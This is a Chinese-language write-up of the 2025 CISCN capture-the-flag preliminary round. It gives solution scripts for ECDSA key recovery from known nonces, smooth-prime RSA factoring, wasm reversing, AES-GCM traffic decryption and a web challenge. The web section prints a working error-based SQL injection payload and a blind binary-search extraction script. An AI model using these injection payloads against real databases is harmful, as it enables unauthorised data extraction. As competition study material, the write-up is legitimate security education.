---
title: 2025 年第十九届全国大学生信息安全竞赛（CISCN）暨第三届长城杯网数智安全大赛—初赛 WriteUp
contest: 2025 CISCN / 第三届长城杯网数智
year: 2025
difficulty: hard
vuln_type: [ecdsa, crypto_rsa, block_cipher, lattice, web_unknown, sqli, pwn_unknown, reverse, ai]
tags: [CISCN 2025 第十九届 长城杯 第三届 网数智, ECDSA 私钥 sha512 Welcome to this challenge 模 n, nonce k sha512 bias+i 已知 60 条, 双层 RSA 内外层 smooth_prime, get_smooth_prime(1024, 20, max_prime=p1), wasm2wat GDSC 版本 0x65, zstd 解压, AES-ECB FanBglFanBglOoO! wOW~youAregrEaT!, ET3RNUMX ET3 GCM AES-128, scapy rdpcap TCP Raw, SQL 无列名注入 where_is_my_flagggggg exp(710) error-based, if((table)>('test'),exp(710),1)]
attack_chain:
  - ECDSA: 私钥 d = sha512(Welcome...) % n, 60 条 nonce 已知 → d = (s*k - e) * pow(r, -1, n)
  - 双层 RSA: 内层 n1=p1*q1*r1*s1 (4 个 512-bit), 外层 n=p*q*r*s (1024-bit smooth 含 p1)
  - get_smooth_prime 把 p1 嵌入 p-1 因子 → Pollard rho 拆出 p1 → gcd(n, n1) 暴露共享 p1
  - wasm2wat release.wasm → 0x65 GDSC zstd 解压 → AES-ECB FanBglFanBglOoO!
  - ET3RNUMX 网络协议 AES-128-GCM KEY=xfqGcVjrOWp5tUGCPFQq448nPDjILTe7
  - exp(710) 错误注入：if((table)>('test'),exp(710),1) → 0.7s 延迟或错误判 1/0
  - blind 二分 32-126 ASCII 范围逐字符
key_payload: "d = (s*k - e) * pow(r, -1, n) % n"
one_liner: 2025 CISCN 第十九届+长城杯第三届初赛：ECDSA 已知私钥 + 双层 RSA smooth prime + wasm GDSC zstd + AES-128-GCM + 错误注入无列名二分。
lesson: CISCN 是国内最大 CTF 双赛（信安+长城杯网数智），初赛涉及密码学/逆向/Web/Pwn/AI 全栈；ECDSA 已知 nonce 直接拿 d；smooth prime Pollard rho 拆因子是 RSA 经典套路。
quality: high
---

# 2025 CISCN 第十九届+第三届长城杯网数智安全大赛—初赛 WriteUp

> 公众号【Real返璞归真】，回复【ciscn2025】获取所有附件

## 密码学

### ECDSA（已知私钥）

```python
from ecdsa import SigningKey, NIST521p
from hashlib import sha512
from Crypto.Util.number import long_to_bytes
import binascii

digest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(), "big")
curve_order = NIST521p.order
priv_int = digest_int % curve_order
priv_bytes = long_to_bytes(priv_int, 66)
sk = SigningKey.from_string(priv_bytes, curve=NIST521p)
vk = sk.verifying_key

def nonce(i):
    seed = sha512(b"bias" + bytes([i])).digest()
    k = int.from_bytes(seed, "big")
    return k

# 60 条消息签名
msgs = [b"message-" + bytes([i]) for i in range(60)]
sigs = []
for i, msg in enumerate(msgs):
    k = nonce(i)
    sig = sk.sign(msg, k=k)
    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))
```

**攻击**：私钥 d = sha512("Welcome to this challenge!").int % n  
**Nonce k(i) = sha512("bias" + bytes([i])).int** 全已知

```python
from hashlib import sha1, sha512
from ecdsa import NIST521p
n = NIST521p.order
L = 66
line = next(ln for ln in open("./signatures.txt") if ln.strip())
mhex, shex = line.strip().split(":")
msg = bytes.fromhex(mhex)
sig = bytes.fromhex(shex)
i = msg[-1]
k = int.from_bytes(sha512(b"bias" + bytes([i])).digest(), "big") % n
r = int.from_bytes(sig[:L], "big")
s = int.from_bytes(sig[L:], "big")
e = int.from_bytes(sha1(msg).digest(), "big")
d = ((s * k - e) * pow(r, -1, n)) % n
print(hex(d))
```

## 双层 RSA（smooth prime）

```python
def get_smooth_prime(bits, smoothness, max_prime=None):
    assert bits - 2*smoothness > 0
    p = 2
    if max_prime != None: p *= max_prime
    while p.bit_length() < bits - 2*smoothness:
        factor = getPrime(smoothness)
        p *= factor
    bitcnt = (bits - p.bit_length()) // 2
    while True:
        prime1 = getPrime(bitcnt)
        prime2 = getPrime(bitcnt)
        tmpp = p * prime1 * prime2
        if tmpp.bit_length() < bits: bitcnt += 1; continue
        if tmpp.bit_length() > bits: bitcnt -= 1; continue
        if isPrime(tmpp + 1): p = tmpp + 1; break
    return p
```

外层 n = p*q*r*s，p-1 包含 p1（小素数）→ Pollard rho 拆出 p1 → `gcd(n, n1)` 暴露共享 p1 → 解内层 RSA。

**flag{fak3_r5a_0f_euler_ph1_of_RSA_040a2d35}**

## Reverse（wasm）

```bash
bin/wasm2wat ~/Desktop/release.wasm -o ~/Desktop/release.wat
```

GDSC 格式：
```
GDSC (4 bytes) - magic
version (4 bytes) - 0x65 = 101
orig_len (4 bytes) - 解压后大小
[zstd data]
```

```python
import zstandard as zstd
dctx = zstd.ZstdDecompressor()
decompressed = dctx.decompress(compressed_data)
```

密钥：`FanAglFanAglOoO!` → Flag.key 替换 'A' → 'B' → `FanBglFanBglOoO!`  
```python
key = b"FanBglFanBglOoO!"
ct = bytes.fromhex("d458af702a680ae4d089ce32fc39945d")
pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
# b'wOW~youAregrEaT!'
```

## Misc（ET3RNUMX 网络协议 + AES-128-GCM）

```python
from scapy.all import rdpcap, TCP, Raw
from Crypto.Cipher import AES
import base64, re
KEY = b'xfqGcVjrOWp5tUGCPFQq448nPDjILTe7'
for pkt in rdpcap('tcp.pcap'):
    if TCP in pkt and Raw in pkt:
        raw = bytes(pkt[Raw].load)
        if raw[:8] == b'ET3RNUMX':
            enc = raw[12:]
            nonce, ct, tag = enc[:12], enc[12:-16], enc[-16:]
            pt = AES.new(KEY, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
            m = re.search(rb'MZWGCZ33[A-Z2-7]+=*', pt)
            if m: print(base64.b32decode(m.group()).decode()); break
# flag{b7c58700-2b01-4dd4-8526-a4a47a65a1a9}
```

## Web（无列名 SQL 注入）

```sql
-1' || if((TABLE information_schema.tables LIMIT 1)>('def','mysql','columns_pra',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1),exp(710),1)#
```

`exp(710)` 错误注入 → 0.7s 延迟判 1/0 → 盲注二分：

```python
def get_flag_char(position, current_value):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        test_value = current_value + chr(mid)
        payload = f"0' || if(('{test_value}')>(table where_is_my_flagggggg limit 0,1),exp(710),1) || '1'='1"
        result = check_condition(payload)
        if result: high = mid  # 条件真：test_value > flag_value
        else: low = mid + 1
    return chr(low - 1)
```
